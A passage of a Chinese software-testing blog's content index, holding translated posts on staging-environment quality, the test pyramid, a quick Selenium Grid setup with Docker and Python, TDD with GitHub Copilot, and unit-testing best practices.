Environment，里面提到了一个很有意思概念反质量文化。个人认为文中讨论的预发布环境可能更接近于国内认知中的测试环境和预发布环境的结合体。尽管如此，文章还是非常有借鉴意义的，随便用ai翻译了一下，供大家参考。\n许多软件开发组织会选择容忍缺陷丛生的预发布环境:很少有人认为这是个大问题。如果你从事软件开发,那么你很可能见过类似普通人的第一辆车那样状态的预发布环境。我们大多数人承诺在最初买下车辆时会修复问题,但实际上车辆保持的状态跟买来时一模一样!车门镜碎了,尾灯闪烁不定,勉强还能开。我们说服自己这些小问题不重要,也太贵了不值得修复。\n我想精确地解释为什么这些“小”问题会给你的工程团队带来重大问题。事实上,它们很可能已经造成麻烦了。然后,我将给你一些建议,如何说服你的公司投入一些资源从根本上解决这些问题。最后,我将为你提供一些想法,以确保你成功完成清理预发布环境的任务——并保持其清洁!\n预发布环境:一些基本事实和现实 当我谈到“预发布环境”时,这意味着任何工程师被期望用来执行其日常职责的开发或测试环境。这包括开发新特性、回归测试、运行自动化测试等。你的公司可能使用不同的术语。\n质量低下、不可靠的预发布环境以及对生产环境的糟糕复制会向你的软件开发生命周期中引入细微的缺陷。它们很可能会被你的开发团队遇到,可能有人会在回顾会上提出几次。但从未采取行动解决它们。你有更高的优先事项;也许知道如何解决问题的人不再为公司工作了。无论如何,总有某种原因导致现在无法处理它。毕竟,它并没有阻塞任何人。然后,使用预发布环境的这种环境缺陷就被接受为一个事实。\n“嘿,伙计们,我注意到这个页面在我们的预发布环境中无法加载\u0026hellip;\u0026hellip;但这在生产环境中却不会发生。我们知道这是为什么吗?🤔” “哦,天呐,它就是这样的😂别担心!” 这就是反质量文化开始渗入你的流程和团队心态的地方。\n这将造成三个问题:\n反质量文化 更高的生产问题风险 你的开发流程中的隐藏成本 反质量文化 什么是反质量文化? 反质量文化是团队范围内对低质量工作方式的接受。\n如果说质量文化是为了质量本身而努力,那么反质量文化就是其反面。你的团队会慢慢对预发布环境中的意外行为变得麻木。他们开始假定(或怀疑)所有出现的意外行为都是由于环境被忽略而不是真正的问题引起的。工程师已经习惯了看到这些问题,学会了规避它们,结果也更加疏忽大意。这是一种反质量文化,直接导致缺陷疲劳。当我们习惯看到缺陷时,缺陷疲劳就会发生,我们会 develop认知偏见并认为不相关的缺陷是环境问题,并因此改变我们的行为,可能会带来负面结果。\n在缺陷疲劳出现之前,优秀的工程师会勤奋地花时间调查这些问题。你可能会注意到这体现在团队聊天消息、会议投诉或回顾会议中的问题上。你的负责人或管理人员可能最初不认为它们足够重要到需要修复的程度。但不太明显的是,在团队将其归类为环境问题之前,调查这个问题所浪费的时间有多少。\n考虑这些场景。它们现在可能正在你的工程部门发生:\n一位工程师正在代码库的一个不熟悉的部分工作,当他们看到页面的一部分突然不像应该的那样加载时。他们想独立工作,并决定在麻烦别人之前自己调查这个问题。他们花了一个小时调试自己的代码,假定他们的更改导致了这个问题,然后代码突然又开始正常工作了。后来他们询问并发现这是一种他们不知道的间歇性问题。 一位工程师完成了一个变更的工作,在发送给QA之前,他们快速检查了这个分支。他们在这个领域很有经验,完全了解软件中的所有怪癖。他们注意到一些奇怪的UI缺陷,但很快就得出结论,不太可能是他们的更改导致的\u0026hellip;\u0026hellip;因为环境一贯有缺陷。他们将任务发送给QA,很快就被打回,因为QA确认这确实是一个真正的问题。 随着时间的推移,第一种情况下的工程师可能会厌倦调查这些环境缺陷,无论是有意识地还是无意识地。最终,第一种情况中勤奋的工程师会变成第二种情况中经验丰富但误解的工程师!\n当你的工程师反复查bug或意外行为时,缺陷疲劳就会发生,他们会感到精神被掏空。过了一段时间后,重复的调查完全停止。如果很有可能只是在浪费时间,那么工程师需要有很强的自我意识和自我控制才能一遍又一遍地查这些缺陷。\n现实情况是:我们大多数人没有时间调查环境缺陷,所以我们依赖这些快速的认知偏见来节省时间。这可能导致错误地总结它们是环境问题\u0026hellip;\u0026hellip;或者错误地总结它们不是环境问题。\n反质量文化如何影响QA工程师 反质量文化会导致QA工程师士气低落。他们字面上就是质量保证,如果他们周围都是缺陷并且需要规避工作,这会让工作变得非常困难,坦白地说,这是令人沮丧的。\n缺陷疲劳也会影响QA工程师,在主要职责是查找缺陷的角色中,这是一种很危险的习惯。我将在下一节中进一步探讨这一点。\nQA工程师可能是预发布环境中最频繁的用户:这是我们运行自动化测试和执行探索性测试的地方。如果你的公司不投入时间确保QA能够在不断遇到环境问题的情况下履行其角色,他们可能会另谋高就。或者,在另一常见的情况下,你剩下的QA工程师的生产力较低,没有发挥他们的全部潜力,这确实很可惜。\n更高的生产问题风险 如果你的预发布环境充满缺陷,在测试期间可能会发生以下情况。一个QA工程师可能会经常遇到一个小的环境缺陷。尽管这些缺陷很小,但它们确实会影响你的用户,虽然是间接的,如果这些环境缺陷的副作用影响了你的运营底线。\n首先,工程师必须弄清楚这个缺陷是由于预发布环境存在问题,还是确实存在于代码中。这需要宝贵的时间。\n或者,如果他们决定不调查疑似的环境问题,这可能会有后果。现实情况是:QA并不总是正确的,这可以理解!如果一个QA工程师有一个截止期限,让他们感到压力,并遇到一个“可能”是环境问题的东西,他们很有可能允许更改继续前进,因为他们认为这不是一个真正的问题,或者他们已经那么疲劳,以至于没有将其注册为一个问题。 QA工程师也不是万能的。\n突然之间,那些微小的缺陷,或者与它们所在区域相关的缺陷,正在生产中出现,你的产品用户正在报告缺陷。如果你曾经在生产中看到过显然的缺陷,“应该”被发现,那么值得考虑环境问题是否遮蔽了真正的缺陷是一个促成因素。\n问问自己:如果你的团队在预发布环境中存在缺陷,当产品代码真的出问题时,他们怎么知道呢?\n你的开发流程中的隐藏成本 但是修复这些需要花这么多钱\u0026hellip;\u0026hellip;\n你的预发布环境中的缺陷已经在耗费你公司的资金。考虑一下每年运行该环境需要花费多少钱。这个成本是固定的,即使你的环境充满缺陷,它也不会改变。即使你的工程师发现它难以使用且对生产力有损,你的公司仍然要为环境支付完全相同的费用。\n如果一个QA工程师经常花时间调查和确认这些问题是环境问题,那么这就是浪费时间。他们本可以用这段时间进行自动化、探索或质疑需求。相反,他们在调查一个你公司的其他工程师可能已经调查过上百次的问题。一个公司在员工集体调查微小缺陷上的花费超过修复它们所需的资金需要花多久?\n如果每个QA工程师都要反复调试预发布环境,每个新的QA工程师都要反复提出同样问题区域的同样问题,这会影响他们的生产力。如果QA花几个小时调查测试失败是真实的还只是环境问题,而不是测试新特性,这也会影响他们的生产力。QA工程师的生产力对于为用户提供价值至关重要。QA通常是发布前的最后一步,如果他们的时间被环境缺陷浪费,这意味着用户得到新特性的速度更慢,从应用程序中获得的价值也更少。这并不像最坏的情况那么明显:你的产品客户发现缺陷并提交缺陷报告。\n由于他们的执着,一些QA工程师通过根据具体情况使用不同的环境来保持高标准。如果他们在一个已知有问题的环境中测试一个区域,他们会在有机会的情况下使用另一个环境。这意味着你的公司花钱维护的这些环境的某些部分不可用,这非常浪费。\n其次,工程师调查这些问题所花的额外时间(如果他们这样做)也会增加你公司的成本。最后,如果你的工程师不调查这些问题,很可能最终会出现生产问题。突然之间,如果一开始就解决了环境问题,这对你的公司的成本要高得多。\n修复预发布环境是必须的。我该如何向公司推销这一点? 你的团队已经投票决定修复预发布环境了。非常好。但这项工作什么时候能完成,需要花费多少成本?你该如何确保一年后不会重蹈覆辙?\n如果你在软件开发领域工作,那么你的产品路线图可能已经排满了未来五年的财政预算。仅仅挤出时间放假已经非常困难,把修复这些“低优先级”bug塞进你繁忙的sprint里就更加困难了。所以,如何向你的团队销售这一点是一个好问题:你将如何做到这一点?\n让我们重申一下发现的问题。经常接受低质量的环境会造成一种反质量文化。这些低质量的环境使工程师更难高效工作,导致沮丧、士气低落和生产力下降。这可能导致员工流失。它甚至可能导致生产bug,让公司付出高昂的代价。\n为了让你的管理者支持这一决定,并了解你的团队为什么应该花时间修复预发布环境,你需要一个计划。\n这就是我们发挥创造力的地方,因为这个问题有很多答案!首先,如果你意识到一个反质量文化已经渗透到你的工程团队,首先要做的就是承认这是一个问题。利用前面提出的要点,你可以努力说服更广泛的团队,这些小的环境bug对你的软件开发生命周期有广泛的连锁反应。鼓励团队注意环境问题,不要像往常一样接受它们,而是给他们一个机会,像记录生产bug一样开始编录这些问题。(如果你还没有这样做,请尽快开始记录生产bug!)\n在认识到问题之后,了解存在哪些bug以及它们出现在哪里是必要的,这样你就可以对问题的规模有一个概念。这将指导你的下一步,也就是选择处理它们的最佳方法。\n修复环境bug的最佳方法将根据你的具体情况有很大差异。一些想法:\n组织一次黑客马拉松比赛,多个团队相互竞争修复最多的环境bug\n以小批量的方式,随时间推移将环境bug修复工作单流入每个sprint,以避免对常规sprint工作的破坏\n在sprint回顾和计划之间的空档期修复环境bug。只要在每个sprint中引入即使是一个环境bug修复点,那也是一个进步,总比没有好。\n我再次鼓励你让你的团队对此感到责任重大。如果你能设定一个目标,在y个sprint内修复x%的环境bug,并在连续的几个sprint中实现这个目标,这将有助于巩固修复这些bug作为一个重要项目的理念。你可以在sprint仪式、技术路线图会议或者定期的其他工程uddle或全体碰头中监控这个目标。开始谈论它!\n一些最后的建议 我建议像对待优先利益相关者一样对待你的工程师,并就环境bug制定某些服务级别协议。确保环境bug以及你实施的任何相关流程得到沟通和记录。如果做得好,这将使你的团队能够在bug出现时及时处理。\n当然,这说起来容易做起来难。刚开始时,你可能是唯一认为你的工程团队应该花时间做这件事的人。我相信通过说服、展示热情和利用这篇文章中的要点,你应该能够说服其他人持同样看法。\n如果你认为环境bug是一个问题,这表明你本能地渴望事情变得更好,这是值得自豪的!你认识到细小的问题会积累成为你和你团队的大问题。帮助别人看到同样的事情并采取行动。\n","date":"2023-09-27T15:56:59+08:00","permalink":"zh.ethanhan.cc/p/%E5%8F%AF%E9%9D%A0%E7%9A%84%E9%A2%84%E5%8F%91%E5%B8%83%E7%8E%AF%E5%A2%83staging%E7%8E%AF%E5%A2%83%E5%AF%B9%E6%B5%8B%E8%AF%95%E7%9A%84%E9%87%8D%E8%A6%81%E6%80%A7/","title":"可靠的预发布环境(staging环境)对测试的重要性"},{"content":"最近看到一篇关于测试金字塔的讨论，觉得非常有道理，原文在这里: https://www.smashingmagazine.com/2023/09/long-live-test-pyramid/\n顺便翻译一下，希望对大家有所帮助。\n我亲爱的同事Jan Philip Pietrczyk曾经对开发者在编写功能代码方面的责任发表过评论：\n“我们的日常工作最终会交到信任我们的人手中，他们不仅信任我们已经尽力而为，还信任我们的代码能够正常运行。” — Jan Philip Pietrczyk\n他的这些话一直深深地印在了我的脑海中，因为它让我们的代码置于依赖它的人们的背景之中。在这个快节奏的世界里，用户信任我们编写最优秀的代码，并且我们的软件“简单地”可以运行。确实，要达到这种信任水平是一个挑战，这就是为什么测试是任何开发堆栈中如此重要的一部分。测试过程评估了我们工作的质量，通过对不同情况进行验证，帮助在问题变得严重之前识别问题。\n测试金字塔是众多测试策略之一。尽管自2012年引入以来，它可能已经成为了主要的测试模型，在过去的十年中占据主导地位，但我发现现在提及它的次数并不像过去那么多。它是否仍然是测试的“首选”方法？与此同时，许多其他方法也已经涌现，因此是否可能是测试金字塔被更适合当今开发的更现代模型所淹没和遮盖？\n这就是我想要探讨的问题。\n测试策略的关键点 与用户建立信任需要一个强大的测试策略，以确保我们编写的代码使产品按照他们的期望工作。我们应该从哪里开始编写好的测试？我们需要多少个测试？许多人一直在思考这个问题。但是Kent C. Dodds发表的一个简短评论让我恍然大悟。\n“最大的挑战是知道要测试什么，以及如何进行测试，以获得真正的信心，而不是测试实现细节所带来的虚假信心。”\n-Kent C. Dodds 这就是起点！确定测试的目标是测试策略中最关键的任务。互联网上充斥着描绘糟糕决策的迷因，其中许多是因为根本不知道特定测试的目的以及我们需要多少测试来确保信心。在测试方面，有一个“正确的比例”，以确保代码经过适当的测试并且按照预期工作。\n问题在于许多开发人员只关注一种类型的测试 - 通常是单元测试覆盖率 - 而不是对各种单元如何协同工作制定策略。例如，当测试一个水槽时，我们可以分别测试水龙头和下水道，但它们是否协同工作呢？如果下水道堵塞，而水龙头继续放水，那么事情就不正常了，即使单元测试表明水龙头正常工作。\n关于测试的方法通常用不同的形状来描述，就像我们已经看到金字塔模型一样。在这篇文章中，我想分享一些我观察到的形状，以及它们在现实场景中的应用，最后总结出哪种测试策略符合我对当今开发实践中良好测试覆盖的个人标准。\n回顾基础知识 在此之前，让我们回顾一些不同测试类型的常见定义，以刷新我们的记忆：\n手动测试 这是由实际人员执行的测试。这意味着测试将要求真实用户按照脚本化的使用案例进行点击应用程序，以及未经脚本化的尝试在不可预见的情况下“破坏”应用程序。这通常是通过与由产品团队观察的用户进行面对面或远程面试来完成的。\n单元测试 这种类型的测试是将应用程序分解为小的、隔离的、可测试的部分，或者称为“单元”，通过分别和独立地测试每个单元以确保其正常运行来提供覆盖。\n集成测试 这些测试关注组件或系统之间的交互。它们一起观察单元测试，以检查它们在集成在一起作为整体工作时是否良好。\n端到端（E2E）测试 在这种类型的测试中，计算机模拟实际用户的交互。将E2E视为验证用户故事的一种方式：用户是否可以完成需要一系列步骤的特定任务，结果是否符合预期？这是从用户体验的一端到另一端进行测试，确保输入产生正确的输出。\n那么，这些测试类型应该如何互相交互呢？测试金字塔是我们传统依赖的隐喻，用来将这些不同类型的测试整合到一个完整的测试套件中，适用于任何应用程序。\n伟大的测试金字塔 测试金字塔是由Mike Cohn在他的书《成功的敏捷》中首次引入，并由Martin Fowler 在他的“实用测试金字塔”文章中进一步发展的，根据测试的性能和成本对测试进行了优先排序。它建议编写具有不同粒度级别的测试，包括较少的高级别测试以及更多快速、经济、可靠的单元测试。推荐的测试顺序是从快速和经济到慢和昂贵，从底部开始有很多单元测试，然后是服务，即中间的集成测试。然后是位于顶部的较少但更具体的UI测试，包括端到端测试。\n在测试社区中，有一种越来越强烈的情感，认为测试金字塔过于简化了测试应该如何结构化的问题。马丁·福勒在关于金字塔形状的文章发布近十年后，在一篇较新的博客文章中对此进行了讨论。我的团队甚至质疑这个模型是否将我们的工作更接近最终用户或更远离最终用户。尽管金字塔的较高层增加了对个别测试的信心并提供更好的价值，但它似乎对整体如何协同工作的更大画面关注较少。测试金字塔感觉对我们来说已经不再适用，至少是在某种程度上。\n从金字塔到菱形 我们团队内部讨论的一个观点是金字塔对单元测试的过分强调。金字塔是一个很好的形状，可以描述什么是单元测试以及它涵盖的范围。但如果你问四个人什么是单元测试，你可能会得到四种不同的答案。也许这个形状需要一些调整来澄清事情。\n我们团队最需要澄清的是单元测试在何时何地停止。金字塔形状暗示了单元测试占据了测试过程的大部分，这对我们来说感觉不对劲。毕竟，集成测试才是将它们整合在一起的部分。\n因此，我们可以将测试策略的金字塔形状演变成菱形的另一种视图：\n集成测试有时被称为测试金字塔中的“被遗忘层”，因为它可能对于单元测试来说过于复杂。但在测试菱形中，它得到了更多的关注（通常分为两个具体的层次）：\n集成测试层 这一层基本上与我们在测试金字塔中看到的一样，但它是为那些被认为“太大而不能成为单元测试”的测试保留的，介于单元测试层和集成测试层之间。测试一个特定组件的测试是这一层的理想类型。\n系统集成测试层 这一层更多地关注“真正的”集成测试，比如从API接收的数据。\n因此，菱形形状暗示了一个流程，即在集成测试完成后立即进行单元测试，但对这些单个测试的强调较少。这样，集成层得到了应有的大量测试，而单元测试的重点逐渐减小。\n手动测试在哪里？ 无论测试策略被称为“金字塔”还是“菱形”，它仍然忽略了手动测试在过程中的关键位置。自动化测试固然有价值，但并不足以使手动测试实践变得过时。\n我认为自动化测试和手动测试是相辅相成的。自动化测试应该消除例行和常见任务，使测试人员能够专注于需要更多人工关注的关键领域。自动化不应该替代手动测试，而是应该与之相辅相成。\n那么，这对我们的菱形形状……或者说金字塔，有什么意义呢？手动测试在这些层次中都没有，但它应该有。自动化测试可以高效地检测错误，但手动测试仍然是必要的，以确保更全面的测试方法，提供全面的覆盖。也就是说，理想的测试策略仍然会将大部分重点放在自动化测试上。\n这意味着测试策略看起来更像是一个冰淇淋筒，而不是金字塔或菱形。\n实际上，这是一种真正的方法，被称为“冰淇淋筒”方法。尽管这种方法需要更长的时间来实施，但它可以提供更高的信心水平和更多的错误检测。Saeed Gatson在一篇可以追溯到2015年的文章中提供了对它的简明描述。\n但是，披萨形状是否足以充分描述测试的全面性质呢？Gleb Bahmutov将这个概念推向了极端，他称之为“测试螃蟹”模型。这种方法涉及截图比较，然后由人工验证差异。Bahmutov将视觉和功能测试视为“螃蟹的身体”，所有其他类型的测试都是“螃蟹的四肢”。事实上，确实有工具在测试过程中提供前后快照，当这些快照叠加在一起时，可以突出显示视觉回归。\n测试奖杯 所有测试方法都是昂贵的，而测试金字塔正确指出了这一点。只是金字塔的形状本身可能不太现实或有效地考虑了测试的全面性质以及每个测试层的重点。因此，我们需要在所有这些方法之间找到一种妥协，准确地描述各种测试层次以及每个测试层次应该受到多少重视。\n我喜欢Guillermo Rauch在2016年简洁地总结了这一观点：\n编写测试 不要太多 主要是集成测试\n让我们更详细地分解一下。\n编写测试 不仅因为它建立了信任，而且因为它在维护方面节省了时间。\n不要太多 百分之百的覆盖率听起来不错，但并不总是好的。如果每个应用程序的每个细节都被测试覆盖，那意味着至少其中一些测试对最终用户体验并不关键，它们仅仅是为了运行而运行，增加了维护的开销。\n主要是集成测试 这里强调了集成测试。它们具有最高的商业价值，因为它们在保持合理的执行时间的同时提供了高度的信心。 如果你花了一些时间关注Kent C. Dodds的工作，你可能会认出以下想法。他的“测试奖杯”方法将集成测试提升到比传统测试金字塔更高的优先级，与Guillermo Rauch的说法完全一致。\nKent讨论并解释了全面测试在产品成功中所扮演的重要角色。他强调了集成测试在测试单个单元之上的价值，因为它更好地理解了产品的核心功能和受尊重的行为。他还建议减少模拟测试，更多地采用集成测试。测试奖杯是一种以稍微不同的方式描绘测试粒度的隐喻，将测试分为以下类型：\n静态分析：这些测试通过执行调试步骤来快速识别拼写错误和类型错误。 单元测试：奖杯对它们的强调较少，不如测试金字塔那么重要。 集成测试：奖杯对它们的强调最大。 用户界面（UI）：这些包括端到端和视觉测试，在奖杯中保持了重要角色，就像在金字塔中一样。 “测试奖杯”将用户的角度置于优先位置，并拥有有利的成本效益比。这是我们的首选吗？这种测试策略是最明智的，但有一个问题。虽然单元测试仍然提供了有价值的好处，但集成测试和端到端测试存在一些缺点，包括较长的运行时间和较低的可靠性。单元测试的好处是有效的，我仍然更愿意使用它们。\n那么，测试金字塔已经过时了吗？ 测试金字塔仍然是一个流行的软件开发测试模型，有助于确保应用程序正确运行。然而，就像任何模型一样，它也有其缺点。其中最大的挑战之一是定义什么构成了一个单元测试。\n我的团队在我们的测试流程中实施了修改后的菱形形状。我们发现这个模型并不完全错误，只是不完整。我们仍然从中获得有价值的见解，特别是在优先考虑运行不同类型的测试时。\n在我看来，开发团队很少坚持纯粹的测试模式，正如Justin Searls所总结的那样：\n人们喜欢辩论要编写哪种类型的测试的百分比，但这是一种分散注意力的做法。几乎没有团队编写具有清晰界限、运行迅速可靠且仅在有用的情况下失败的表达性测试。相反，专注于这一点。\n这对我的团队经验也是如此，因为划分和定义测试通常是困难的。但这并不是坏事。甚至Martin Fowler也强调了不同测试模型对我们如何共同看待测试覆盖率产生的积极影响。\n因此，我绝不认为测试金字塔已经过时。我甚至可能会认为，现在了解它同样重要。但关键不是过于纠结于其形状或任何其他形状。最重要的是记住，测试应该快速而可靠，并且仅在出现真正问题时才失败。它们应该有益于用户，而不仅仅是追求完全覆盖。通过在测试设计中优先考虑这些方面，您已经完成了最重要的事情。\n","date":"2023-09-11T14:58:16+08:00","permalink":"zh.ethanhan.cc/p/long-live-the-test-pyramid/","title":"Long Live the Test Pyramid"},{"content":"今天在看selenium grid文档的时候，发现selenium grid4的设计还是不错的，想顺手体验一下，于是就发现了docker-selenium项目，可以快速的设置好selenium grid环境，非常简单方便。\n然而后面准备用python去写个简单例子的时候，发现很难找到python代码的例子，好不容易找到1个却发现跑不起来，于是简单的看了下源码，找到了正确的打开方式，这里简单分享一下。\nselenium grid的使用场景 在我看来grid的使用场景有两个\n在不同的浏览器上并行跑用例，这比挨个在不同浏览器上跑要省不少时间 启动多个节点在同一个浏览器上并行跑用例，同样也是节约了执行时间 快速安装好selenium grid环境 Selenium grid有多种模式，比如Standalone, Hub and Node，对于初次体验来说无脑用Standalone是不会有问题的。\n传统的方式是使用java来运行jar包安装，不过docker selenium提供了更简单的方式，直接用docker跑镜像就好了。 比如下面的命令就启动了1个firefox的远程节点。\n1 docker run -d -p 4444:4444 -p 7900:7900 --shm-size=\u0026#34;2g\u0026#34; selenium/standalone-firefox:4.11.0-20230801 这里暴露了2个端口\n4444: hub的端口，直接访问可以看到所有节点的信息 7900: vnc的端口，访问http://localhost:7900/?autoconnect=1\u0026amp;resize=scale\u0026amp;password=secret就可以看到远程节点上的浏览器运行情况，非常方便了 连接远程节点进行测试 代码很简单，我的运行环境是\npython: 3.10.2 selenium: 4.11.2 selenium gird: selenium/standalone-firefox:4.11.0-20230801 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 from selenium import webdriver from selenium.webdriver.firefox.options import Options import time ff_option = Options() dr = webdriver.Remote( command_executor=\u0026#39;http://127.0.0.1:4444/wd/hub\u0026#39;, options=ff_option ) dr.get(\u0026#39;https://google.com\u0026#39;) time.sleep(5) dr.quit() 这里需要注意的是启动链接remote节点的时候需要传入ff_option，之前的版本的代码里需要传入类似于 desired_capabilities={'browserName': 'firefox', 'javascriptEnabled': True})的参数，在某个版本的selenium里这个参数被废弃掉了，需要用浏览器的option来替代。\n在脚本运行的时候用浏览器访问http://localhost:7900/?autoconnect=1\u0026amp;resize=scale\u0026amp;password=secret可以看到脚本的执行过程，挺有意思的。\n总结 selenium grid的热度应该不高，所以实践分享和代码都不是很多。不过如果有同学需要做sass服务，提供远程执行selenium测试用例的测试平台的话，selenium grid是一个非常不错的开箱即用的选择。特别是selenium grid的Distribute的实现十分的工程化，可以配置的东西很多，而且对外提供了一系列的接口，二次开发的潜力还是巨大的。\n","date":"2023-08-21T17:13:22+08:00","permalink":"zh.ethanhan.cc/p/selenium-grid-quick-setup/","title":"Selenium Grid Quick Setup"},{"content":"martin fowle的博客上新发了一篇关于AI和TDD的文章，先翻译一下，然后聊聊我的看法。\n使用测试驱动开发(TDD)与 GitHub Copilot 编码助手\nAI 编程助手如 GitHub Copilot 的出现意味着我们不再需要测试了吗?TDD 将过时吗?为了回答这个问题,我们来看一下 TDD 如何帮助软件开发的两点:提供良好的反馈,以及在解决问题时“分治法”。\nTDD 提供良好的反馈 良好的反馈要快速和准确。在这两方面,没有什么能比一个编写良好的单元测试更好。不论是手动测试,文档,代码审查,甚至是生成式 AI,都不能取代。事实上,大型语言模型提供无关信息,甚至 hallucinate。当使用 AI 编程助手时,尤其需要 TDD。我们需要对自己编写的代码快速准确的反馈,也同样需要对 AI 编程助手编写的代码快速准确的反馈。\nTDD 通过分治法解决问题 通过分治法解决问题意味着较小的问题可以比较大的问题更早解决。这实现了持续集成,基于主线的开发,最终实现持续交付。但是如果 AI 助手为我们编写了代码,我们是否真的还需要所有这些?\n是的。大语言模型很少能在一次提示后就提供我们所需的确切功能。所以迭代开发还没有走到尽头。此外,大语言模型似乎在通过思路提示的增量方式解决问题时“激发了推理”(参见相关研究)。基于 LLM 的 AI 编程助手在分治法解决问题时表现最好,而 TDD 是我们在软件开发中所做的。\n使用 GitHub Copilot 的 TDD 技巧 Thoughtworks 从年初开始就一直在使用带有 TDD 的 GitHub Copilot。我们的目标是实验、评估和发展一系列围绕使用该工具的有效实践。\n0. 开始 从一个空白的测试文件开始并不意味着从一个空白的上下文开始。我们通常从一个带一些粗略笔记的用户故事开始。我们也会与配对伙伴讨论一个起点。\n所有这些上下文都是 Copilot 在我们把它放入一个打开的文件之前(例如测试文件顶部)“看不到”的。Copilot 可以处理拼写错误、点式格式、糟糕的语法等等。但是它无法处理一个空白文件。\n一些对我们有效的启动上下文示例:\nASCII 艺术画布 验收标准 引导假设,例如: \u0026ldquo;不需要 GUI\u0026rdquo; \u0026ldquo;使用面向对象编程\u0026rdquo;(而不是函数式编程) Copilot 使用打开的文件作为上下文,所以同时保持测试文件和实现文件打开(例如并排)大大提高了 Copilot 的代码补全能力。 1. 红色 我们首先编写一个描述性的测试示例名称。名称越描述性越好,Copilot 代码补全的表现也越好。\n我们发现给出Given-When-Then结构有三方面帮助。首先,它提醒我们提供业务背景。其次,它允许 Copilot 为测试示例提供丰富且富有表现力的命名建议。第三,它揭示了 Copilot 从文件顶部上下文(如前一节所述)对问题的“理解”。\n例如,如果我们正在进行后端编码,Copilot 将我们的测试示例名称补全为“给定用户\u0026hellip;\u0026hellip;点击购买按钮”,这告诉我们应该更新文件顶部的上下文以指定“假设没有 GUI”或“此测试套件与 Python Flask 应用程序的 API 端点接口”。\n更多要注意的“坑”:\nCopilot 可能会一次性补全多个测试。这些测试往往毫无用处(我们删除它们)。 随着我们添加更多测试,Copilot 将一次补全多行而不是一次补全一行。它通常会从测试名称中推断出正确的“arrange”和“act”步骤。 这里的坑:它不太常推断出正确的“assert”步骤,所以在进入“绿色”步骤之前,我们特别注意确保新的测试失败是正确的。 2. 绿色 TDD 表示为一个三部分轮子,右上方一 third 突出显示为“绿色”\n现在我们准备好让 Copilot 在实现中提供帮助了。一个已经存在的,富有表现力和可读性的测试套件可以最大限度地发挥 Copilot 在此步骤的潜力。\n也就是说,Copilot 通常无法采取“小步骤”。例如,在添加新方法时,“小步骤”意味着返回一个硬编码的值以通过测试。到目前为止,我们还没有能够说服 Copilot 采用这种方法。\n回填测试 Copilot 并没有采取“小步骤”,而是跳跃前进,提供的功能通常相关,但还没有经过测试。作为变通方法,我们“回填”缺失的测试。虽然这与标准 TDD 流程不同,但我们还没有看到我们的变通方法存在任何严重问题。\n删除并重新生成 对于需要更新的实现代码,让 Copilot 从头重新生成代码是让它参与的最有效方法。如果这失败了,删除方法内容并使用代码注释逐步描述方法可能有助于解决。如果这也不行,最好的前进方法可能是暂时关闭 Copilot 并手动编写解决方案。\n3. 重构 TDD 中的重构意味着进行增量更改以提高代码库的可维护性和可扩展性,同时保留行为(和一个可工作的代码库)。\n对此,我们发现 Copilot 的能力有限。考虑两种场景:\n“我知道想尝试的重构举措”:IDE 重构快捷方式和多光标选择等功能可以更快地帮助我们实现目标,而不是 Copilot。\n“我不知道采取哪种重构举措”:Copilot 代码补全无法引导我们完成重构。然而,Copilot 聊天可以在 IDE 中提出代码改进建议。我们已经开始探索该功能,并看到它在小范围内提出有用建议的前景。但我们在更大规模的重构建议(即超出单个方法/函数)方面还没有太多成功。\n有时候我们知道重构的举措但不知道执行它所需的语法。例如,创建一个测试模拟以允许注入一个依赖项。对于这些情况,Copilot 可以通过代码注释中的提示提供内联答案。这省去了我们切换到文档或网络搜索的上下文。\n总结 常说的“垃圾进,垃圾出”适用于数据工程和生成式 AI 以及大型语言模型。换句话说,更高质量的输入允许更好地利用大语言模型的功能。在我们的例子中,TDD 保持了高水平的代码质量。与其他情况相比,这高质量的输入导致了更好的 Copilot 性能。\n因此,我们建议将 Copilot 与 TDD 一起使用,希望上述技巧能帮助您做到这一点。\n我的想法 在给出了足够的上下文以及使用一些正确技巧的前提下，用copilot写测试用例问题不是不大的，这里最有用的部分是copilot能给测试用例取名，解决了tdd的一个巨大痛点。 copilot会生成一些无用的用例，所以好的测试思维很重要，无效的用例就需要跳过； copilot断言能力有限，本质就是copilot无法从用例中推理出需要测试的点，这应该是模型的能力有限，后面更高的大语言模型版本可能会解决这个问题; 实现的代码可能还是要自己写，然而copilot会帮我们补全代码，所以工作量是可控的； 重构可能还是要靠自己，其实本质上就是copilot会写代码，但不一定会写出好的代码，重构其实并没有让功能变得更强，只是让代码变得更好维护，不过大语言模型如何去理解好维护这个概念，目前还不是特别清楚。 ","date":"2023-08-18T10:26:12+08:00","permalink":"zh.ethanhan.cc/p/tdd-with-ai/","title":"Tdd With AI"},{"content":"看到一篇关于单元测试最佳实践的文章，简单翻译一下，很多都说到了点子上，不能赞同更多。\n单元测试是对软件应用程序中各个单元或组件进行的软件测试。单元测试旨在验证每个软件单元的执行是否符合设计预期。单元测试可以确保代码质量,提高可维护性,方便重构,并提高开发速度。\n当谈到最佳实践时,这里有一些应该遵循的:\n为每个缺陷编写新测试:当你遇到一个缺陷时,编写一个暴露该缺陷的测试。这也称为回归测试。\n保持测试的小而聚焦:一个单元测试应该限制在一个独立的函数或方法中。这使得当测试失败时更容易识别和修复问题。\n隔离你的测试:确保每个测试都是相互独立的。这允许你单独运行每个测试,并以任意顺序运行。(划重点了)\n按测试类型组织测试:你可以根据它们测试的对象类型或测试类型来组织测试。这使得查找和运行相关测试更容易。\n每次测试一条代码路径:每个测试应该验证方法中的一条明确的代码路径。这使得理解被测试的内容以及测试可能失败的原因更容易。\n避免在测试中加入逻辑:当你在测试中加入逻辑时,你有引入测试缺陷的风险。保持测试的简单。(重点)\n避免在被测试的类中使用静态方法:静态方法不能在子类中重写,这使得它们难以测试。避免在你要测试的类中使用静态方法。\n避免测试实现细节:你的测试应该关注代码的行为,而不是它的实现。如果测试实现细节,当你的代码行为保持不变时,测试仍可能中断。\n首先为对应用影响最大的方法编写测试:将测试工作集中在对应用影响最大的方法上。这通常包括包含复杂逻辑或与外部资源交互的方法。\n使用 AAA 模式:准备测试数据和测试环境(Arrange)、执行(Act)、断言(Assert)是编写单元测试的典型模式。单元测试方法的安排部分初始化对象和传递给被测试方法的数据值。执行部分调用带有Arrange参数的被测试方法。断言部分验证被测试方法的行为符合预期。(划重点)\n原文如下:\n𝗨𝗻𝗶𝘁 𝗧𝗲𝘀𝘁𝗶𝗻𝗴 𝗕𝗲𝘀𝘁 𝗣𝗿𝗮𝗰𝘁𝗶𝗰𝗲𝘀\nUnit tests are software testing where individual units or components of a software application are tested. Unit testing aims to validate that each software unit performs as designed. Unit tests ensure code quality, and ease of maintenance, facilitates 